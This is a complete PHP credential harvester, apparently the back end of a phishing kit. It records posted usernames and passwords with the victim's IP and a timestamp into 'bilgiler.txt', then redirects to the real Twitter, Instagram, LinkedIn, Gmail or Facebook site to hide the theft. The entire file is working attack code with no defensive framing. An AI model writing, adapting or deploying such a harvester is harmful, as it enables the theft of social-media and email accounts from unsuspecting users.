<?php 
error_reporting(0); 

date_default_timezone_set('Europe/Istanbul');

$kullaniciadi = $_POST['Username'];
$sifre = $_POST['Password'];
$ip =$_SERVER["REMOTE_ADDR"];
$tarih = date('d.m.Y - H:i');
$site = $_POST["from"];

 $veri = fopen ("bilgiler.txt" , 'a'); 
$yaz=$kullaniciadi.";".$sifre.";".$ip.";".$tarih.";".$site."\n";
fwrite ( $veri , $yaz ) ;
fclose ($veri);

if ($site == "twitter") {
 header("Location: https://www.twitter.com/");

die();
} elseif ($site == "instagram") {
  header("Location: https://www.instagram.com/");

die();

}
elseif ($site == "linkedin") {
  header("Location: https://www.linkedin.com/login/");

die();

}
elseif ($site == "gmail") {
  header("Location: https://mail.google.com/");

die();

} else {
  header("Location: https://www.facebook.com/");

die();
}


 ?>
